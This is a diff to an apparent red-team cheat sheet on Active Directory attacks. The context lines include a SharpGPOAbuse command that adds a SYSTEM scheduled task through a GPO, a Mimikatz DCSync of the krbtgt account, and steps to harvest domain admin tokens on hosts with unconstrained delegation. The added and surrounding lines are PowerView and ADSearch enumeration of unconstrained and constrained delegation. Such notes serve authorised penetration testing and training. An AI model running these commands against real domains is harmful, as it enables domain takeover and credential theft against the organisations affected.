@@ -678,7 +678,6 @@ net localgroup administrators
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c <SHARE>\<EXECUTABLE FILE>" --GPOName "<GPO>"
 ```
 
-
 ## Delegation
 - In unconstrained and constrained Kerberos delegation, a computer/user is told what resources it can delegate authentications to;
 - In resource based Kerberos delegation, computers (resources) specify who they trust and who can delegate authentications to them.
@@ -686,9 +685,13 @@ net localgroup administrators
 ### Unconstrained Delegation
 - To execute attack owning the server with unconstrained delegation is required!
 
+#### Discover domain users which have unconstrained delegation
+```
+Get-DomainUser | Where-Object -Property useraccountcontrol -Match TRUSTED_FOR_DELEGATION 
+```
+
 #### Discover domain computers which have unconstrained delegation
 - Domain Controllers always show up, ignore them
-- Use the ```-domain``` flag to check for other domain
 ```
 Get-DomainComputer -UnConstrained
 Get-DomainComputer -UnConstrained | select samaccountname
@@ -698,6 +701,7 @@ Get-DomainComputer -UnConstrained | select samaccountname
 .\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
 ```
 
+### Unconstrained delegation computer
 #### Check if any DA tokens are available on the unconstrained machine
 - Wait for a domain admin to login while checking for tokens
 ```
@@ -784,15 +788,14 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN
 
 ### Constrained Delegation
 - To execute attack owning the user or server with constrained delegation is required.
+- 
 #### Enumerate users with contrained delegation enabled
-- Use the ```-domain``` flag to check for other domains
 ```
 Get-DomainUser -TrustedToAuth
 Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
 ```
 
 #### Enumerate computers with contrained delegation enabled
-- Use the ```-domain``` flag to check for other domains
 ```
 Get-Domaincomputer -TrustedToAuth
 Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
